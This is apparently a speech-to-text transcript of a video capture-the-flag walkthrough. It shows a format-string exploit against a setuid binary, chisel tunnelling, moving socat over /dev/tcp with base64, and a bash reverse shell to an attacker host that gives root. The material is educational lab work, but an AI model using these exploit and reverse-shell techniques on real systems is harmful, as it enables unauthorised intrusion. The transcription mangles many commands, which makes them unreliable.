three characters here and then we do a p and then this mat this piece is what's going to matter but we can just do 10 here and then dollar n and anything after this is fine because i can't imagine our print f payload is going to be bigger than this so i'm just gonna do echo dash n wc-c and it's nine characters i like keeping everything in increments of eight so i'm going to add a bunch of stuff to the end of this so we can say is that really nine if i put this in single quotes it's 13. if i did that echo dash and without single quotes it probably translated the dollar signs but that is a good catch uh so we can add a blank a three times and if we ever see four one in our payload we know we don't want to do that this memory address or this space is going to be reserved for our payload then i'm going to do eight b's and then we'll do eight c's is that eight one two three four one two three four so this is gonna be pretty much our payload and if i put this in here let's go execute ersa tool again print and it just segfaulted what i did not expect that oh because i have it writing so i wrote to a random spot and memory and crashed the program oh let's see so let's do percent 10 and we need to replace all these with a's actually so let's echo dash and let's get rid of that dash n let's see one two a a two three four one two three four one two three four ten and i just added one two three four five one two three four five okay i hope this is still if i grab this this will be 16 hopefully echo dash n wcrc 16. okay so this payload won't be writing anything into memory so we should not seg fault it and it was 10. i just did 10 because i wanted double digits in case this went into double digits but i can see 42's right here and that is all my b's um if i did not get as lucky as i did we'd start at like nine and then send the payload and we probably have to add another a because again all this spacing matters or padding i should say and here we see it not printing what we want we wanted all these four twos because that means it's printing this if i change this if i want here copy and we put eight c's and then we can do d's doesn't really matter we're now printing 43s and this matters because we're going to be writing into um this whatever memory address is here so let's go back into our payload so if we go into exploit i can go into here and now we can say p dot send line i'm going to say percent 10 this one doesn't matter it's mainly for spacing we want to write 47 and 47 is a slash so if i'm going in here all these characters are going to be in the decimal and slash is 47. so let's go back to here so i print 47 things to the screen and then i'm going to grab the memory address and i'm not writing that yet that's going to be in like a second but we're writing it um the dollar n is going to write 47 at whatever this string is and here's where the um padding becomes important so if i just l adjust 60 uh no 64 is not the length uh we wanted 16. and we can just put a period like that and if i cut this so i can copy easier if we go into python we can see exactly what this looks like so python3 print like that and we just printed 16 characters so again this gets us to where our bees are i screwed that up though i wanted 16 like that because all the padding i wanted to be is periods so glad i took a time to um show you that because caught a bug that would have bit me later so ljust it's going to do that okay and then we want to write the memory address of ersa der and we close that line and what we just did here is a slash so we're going to need to do a lot more and this will be d e v slash s h m well i guess that right of the number of things i did but 47 if i go back to my ascii table d is going to be 100 then e is 101. so 5 is this so i said 100 101. and like this is where the l just helps because we just increased this length by one but because we're padding in this python we don't really have to worry about that so now we need v and v is going to be 118 one one eight we already had the slash that's 47 s is here 115 and h is 104 so 115 104 115 104 and then m m is going to be 109 okay so let's try running this now so if i do python 3 exploit dot pi hopefully we do not seg fault and i'm just going to close this gdb session or whatever i had there cannot concatenate string to bytes let's see it's how i have this ersa dirt right can only connect string not bytes let's see what is if i just do here i say der let's just print this real quick see exactly what that is let's see i wonder if it's the actual payload here if i have to convert this so dot encode maybe that's it whoops dot encode i swear like dealing with the correct type and getting it all that is correct is probably where i spend half the time when i code these scripts especially within parent tools python 3. so maybe that'll work that looks potentially better uh i don't know if that is it but we can certainly check ps ef grep um ursa gdb dash p one one two nine seven eight and then we wanted to x slash s and e rsa der and it's just m because we forgot something we successfully wrote it but we kept overwriting the same exact thing right so if i go back to the script if i do plus one plus two plus three [Music] four five six seven so now let's check this again so exit gdb run the exploit script and now we can do ps ef grep gdb or grep ursa and gdb dash i one one three zero seven two or dash p for pid and then x slash s and uh was it usa der we have now successfully wrote it to dev shm instead it was before like opt easy rsa so now we can overwrite this variable and when we um call the system it should now execute easy rsa out of that so let's do dev shm uh v easy rsa say it's been bash i'm going to do echo pwned so if it ever echoes pwned we know we pound it so i do help here help uh oh continue because i'm debugging it and we probably should get out of gdb because when you're in gdb is going to break that set uid thing ls chmod plus x this also has to be executable so we go here and then what do we do next enter help create help let's see we did something to dev shm error reading device hm pki so it's trying to read files there we didn't get it to go to system is it revoke how do we get to system not implemented let's see v easy rsa we're also going to touch tampponed ls-la temp pound doesn't exist so let's try running again help create test does that file exist it does exist so it's just not printing that pwn to screen yeah it did not print prone to screen but we definitely know it executed it because we have that tampon the reason why it's ipsec on this is because i never gave it set uid when um i copied it over but if we did ch mod i think four seven five five year essay tool lsla ersa tool this will probably now work rm temponed python 3 exploit enter create test lsla tamponed and it didn't but i'm confident um it'll work on the remote system hopefully i'm probably screwing something up oh i did not see its own root root essay tool that's why i forgot so let's try this last time hopefully rm-rf tamponed doesn't exist run or not run python3 exploit.pi create test temponed because when i change the owned to root it took my set uid permission away like how many times can you fail this uh because of the demo gods but that's how you know i've played with this binary a lot that as soon as i do a mistake i'm like oh no that's exactly what happened so create test and it is now owned by root so if it had a set gid call then it would change the group probably but yeah we know we have the exploit working now the big painful thing is um we don't have pwn tools on the remote host if we even have this remote host up still we had to do some tunneling to get to it pki listening i think all my shelves may have died so we'll have to get those again and then when we get there we probably need to copy like socat and then send a netcat session all the way back to our box so we can interact with it over prone tools so what i'm going to do is exit a bunch of things so we can clean up our sessions a little bit see that is three what is six we can close this seven we don't need that okay so this is all we should need open up chisel and it's connected there i'm going to refer to some notes i have to figure out exactly what i did to get to the pka box because i took a break just before doing that printf thing so i took a few minutes to think about the tunnel and i haven't actually done this yet so hopefully it works but i want to go through my thought process on what i'm about to do so probably should write all these port forwards down so we can understand what they do so let's do this okay so this let's see i want to get syntax highlighting i do that w notes dot sh there we go now we get syntax highlighting so this one is going to allow um [Music] attacker box to hit pki on port 80. then what this does is allows pki box to hit atk box on port 9001 and we use that for the shell so we probably want to add another one so 192.164.2 we'll call this we can put both these to 9001 now we can say nine thousand two one seventy two thirty zero nine nine thousand two yeah nine thousand two will say web server on atk and then our box will need to hit the pki box on a port that we use for standing up this ersa tool binary so we can say um decay box hit pki on um usa port and we can set that port to anything we want so this will be our 8000 pki or wait we want to listen on 8001. we'll go to the pki on port we'll say um 9003 so i think this will be all we need so i'm going to cat notes i'm going to run this chisel command with everything we have so tissue like that then copy this to get all of our ports lined up and like i said this is a complex port forwarding attack because we're using so much and i'm really hoping it works connection refused to something is that because i can't talk to it yet tech box to hit pki see listening did something get screwed up here let's see v let's cp notes dot sh you could swore that was right but it's always possible copy and pasting screwed something up so let's copy and paste the entire thing instead of breaking it up okay sh copy this entire string give up let's see ss lntp grep 8001 am i already listening on this port no grab 8 000 i'm not listening oh wait i was 8001 is the port i'm listening um chisel on so that is why v notes we can say 8001 let's do 8003 i guess cat nerds.sh and we can execute this i really hate when we get down to like using all of these ports okay that looks good let's open up a new pane uh we'll call this ford and let's see nclvmp 9001 we go here and let's see if we get the reverse shell again i'm just sending a bunch of request and we're on the pki server so python 3 c import pty pty dot spawn ben bash st2y raw minus echo fg enter enter so the first thing we have to do is see if we have socat here we probably don't so we have to copy it up not a big deal so let's go back to our fords cd dub dub dub which socat and the first thing i'm going to do is copy this version of socat up and then if this doesn't work i'm going to go to the static library page uh python see the first thing we have let's see where am i listening on web i think that would be 8003 i have or no 9002 is my web server so let's do python3 dash m hp dot server 9002 so if i wget 192.168.254.2 9002 socat please download uh curl oh you gotta be kidding me um can i like cat that oh wait i'd have to dev tcp 9002 like that and then on this ford nc all vmp 9002 socat permission denied see dev shm i think that permission denied was i just can't write to my home directory which is a bit weird i have a single quote there lsla sir cat is zero bytes so that did not work it did connect let's see we want to get this binary up there can i do echo instead that is one it's not exactly what i wanted v test.text hello world nc lvmp 9002 test.txt so that's not writing so we have to figure out a good way to write this um maybe i could use python to download it but i swear i've done curl with the dev tcp thing and wrote before um what i just do echo let's try cat cat test.txt hello world so what i'm guessing happened before is so cat had a null byte or something and canceled my transfer so i'm going to base 64 in code soca do socat.b64 and we're going to try doing it this way to circat.b64 it's taking longer and that looks promising so let's do base64-d socat like that 2 socat chmod plus x socat permission denied this may be because i'm in dev shm and maybe that can't write yes dev shm has no exec so let's try copying socat to temp dot slash socat error loading library so this is because it is not static encoded but we have transferred it so let's go static binaries github go here socat that's not what we expected let's see binaries linux x8664 socat download and over here cp downloads socat here base64 encode it and then we also need to download it stand up to listener uh we need let's see not echo it's cat like that and then let's just move socat to socat.b64 basics4-d whoops ls chmod plus x socat there we go we finally have socat running so what i want to do is go all the way back to what port i'm expecting it let's do let's see no long need that web server let's say we want to go to downloaded now exploit is what we want and where's my notes i put it here yeah v notes sh like this and we want to be able to hit this so it was the last one pki 9003 is what we want to listen on so we want to do socat tcp dash listen 9003 reuse address and fork it and execute ersa tool and if i do nc localhost was it 8003 we are now on this box so all that's left to do is update our attack script to use this box and i think bash scripts should be able to still execute out of here if it doesn't then i'll move it over to temp echo ben bash easy rsa echo bash easy rsa so if i cat this file should just execute bash um i probably should have done bash dash p yeah let's just redo that easy rsa just in case it's needed it's h mod plus x easy rsa we'll see if it works i'm passing the system command to this so maybe it will um we can also touch tampponed okay so now let's update our parental script so vim exploit dot pi and all we do is change p now is equal to remote 127.001 and 9003. so if i execute python wall hold on yes i'm going interactive so if i do python3 exploit.pi we cannot connect and that's because socat is not running where is the socat command run it uh we were on 8002 i think is what i connected to because 8001 is what i had chisel server running as ford let's see where's that command 8003 we sent it so i'm going to create test and it did not execute bash wait id exit so it does not look like it worked ls and there is not a temp pond let's see the one thing i'm going to do i guess we can change this to be just temp and see if that works confused right now because i'm pretty sure i had done it in this directory before but let's change it to temp and see what happens so yank 4 lines and we want t m and the numbers man ascii 116 m is going to be where are you 109 and p is 112. what if i need a trailing slash i shouldn't because it did work on my local box when we were playing with it and it was pretty reliable so let's see we did socat run this and then create test and what is this saying error reading slash t pki so it did not write tmp do i have the output from before dev shm so that wrote correctly back then but tmp did not if i do lsla if i should copy dev shm easy rsa here stage mod plus x easy rsa because we definitely need that and let's see i'm also going to put the touch before the bash because that bash command could be hanging and we just don't get the shell that way so echo bin bash 2 easy rsa echo [Music] easy rsa echo bash dash p easy rsa okay so that now should be good run socat run this exploit again no pwned sad day v exploit.pi tmp and we did increment that weird you can add a slash to the end uh let's just add a null byte actually zero zero oh we don't want to do that because after that it puts the um string so we don't want to do that let's just add a slash three exploit.pie we are still listening create test where is tmp it's still just slash t create pepsac so something i'm doing is changing things because no longer is a t there i just do create tea let's do create temp it's just slash now what if it's because like the string is so small this is weird go back to exploit.pi i'm going to leave it at devshm and it may just be getting too late for me and i may have to just continue this in the morning because this is not making sense to me create test if i go up here it is just slash d dev shm see is this going to be local or remote so we connected to 127.001 on 8003. this did create test and it did print dev shm and now it's just doing slash d that's still on 8001 great test great test do this create test something is different and i don't know what it is maybe it's i'm sending data too fast and there was no latency when i did it through a process but doing it through a network there is latency so i wonder if i go back here i probably only want need slash temp if i do p dot receive is it until and i think it sent two new lines so if a script hangs we know this receive until is broken so let's do python3 exploit.pi we've connected create test and i think no we still overwrote let's see let's put some more logs in log and we can say sending payloads and then payloads sent and we can say p dot send line and then p dot receive until there's just a coin i think and see localhost 8003 yup just not call in a pound and then we send line b create test we can stay hanging interactive python 3 exploit.pi payloads sent and still error reading just slash slash which i really don't like broken pipe i wonder if we're sending a bad character now don't know what bad character we would be sending could it be like a null byte in this but i don't think so if i do something there payload sent create test that just like crashed the program so that's not it let's see let's just nc localhost 8003 print test sure that's fine create test and it should create i don't even put the show the paths because it's downloading the it's actually got files there so we know we did some type of overwrite but just did not work air reading yeah slash pki see still slash this can be a crazy question oh wait it executed pwn that time so that time it worked however um it did not at the same time so we definitely have code execution but i'm guessing one of these times i exited i actually exited bash which means i'm not done yet id see exit id that did not work i don't know what i just did there i wonder if it's just not a reliable exploit like i wonder if this time where it's hanging right now it just worked but i can't execute bash so it hung that's probably it so cat easy rsa let's see um let's do we still have a tunnel so 172 30 no um this forward which one is a web we are listening 9002 is where we can stand a reverse shell so we want to send it to 172.309 and it should get to us so let's see nclvm it's just v easy rsa we can do ben bash bash dash well bash dash i dev tcp 192 168 254 slash what did i say 9002 see right and one touch temp pound two and that looks good so nc lvnp easier say 9002 easier essay cat dev tcp 192.168.254.2 9002 to easy rsa okay nclvmp9002 and we're going to run this a few times there we go rochelle gotten um maybe it was that simple is this now reliable it was just i couldn't use a drop into a bash prompt let's see that time it did not work so it isn't 100 reliable see if i exit this rerun it did not work that time did not work that time there we go got a shell so the exploit just itself is not fully reliable but now we are root on the pki server and let's see html index uploads let's see what can we do is it just slash where is root.text am i not done yet i thought it was yeah there we go cat root.text we can read the flag notes.txt as well to see all the resources used for this box but and there was a unintended with the exploit if you ran like peace by when executing the esra tool you can see it called some applications with a non-absolute path i'm sure if you get like oxds blog he'll talk about that but i am tired so i'm going to go to bed and just call it for the video take care guys and see you all next time